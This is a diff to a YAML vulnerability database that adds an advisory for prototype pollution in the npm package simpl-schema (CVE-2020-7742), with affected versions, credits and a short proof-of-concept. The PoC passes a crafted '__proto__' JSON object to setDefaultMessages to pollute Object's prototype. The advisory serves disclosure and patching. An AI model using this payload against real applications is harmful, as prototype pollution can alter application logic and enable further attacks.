@@ -1,4 +1,40 @@
 ---
+- id: snykio:npm:simpl-schema:1016157
+  title: Prototype Pollution
+  description: |
+    [simpl-schema][1] is a schema validation package that supports direct
+    validation of MongoDB update modifier objects.
+
+    Affected versions of this package are vulnerable to Prototype Pollution.
+
+    ### PoC   {#poc}
+
+        const SimpleSchema = require("simpl-schema").default;
+        let obj = {};
+        console.log("Before : " + obj.polluted);
+        SimpleSchema.setDefaultMessages(JSON.parse('{"__proto__":{"polluted":"yes"}}'));
+        console.log("After : " + obj.polluted);
+
+
+
+    [1]: https://github.com/aldeed/node-simple-schema
+  affected_package: simpl-schema
+  vulnerable_versions:
+  - "<1.10.2"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2020-7742
+  cwe:
+  - CWE-400
+  disclosed_date: 2020-10-01
+  created_date: 2020-10-07
+  last_modified_date: 2020-10-07
+  credit:
+  - Alessio Della Libera (d3lla)
+  references:
+  - https://github.com/aldeed/simpl-schema/blob/main/package/lib/utility/merge.js
+  source_url: https://snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157
 - id: snykio:npm:simpl-schema:20180219
   title: Regular Expression Denial of Service (ReDoS)
   description: "[`simpl-schema`][1] is a A schema validation package that supports\ndirect
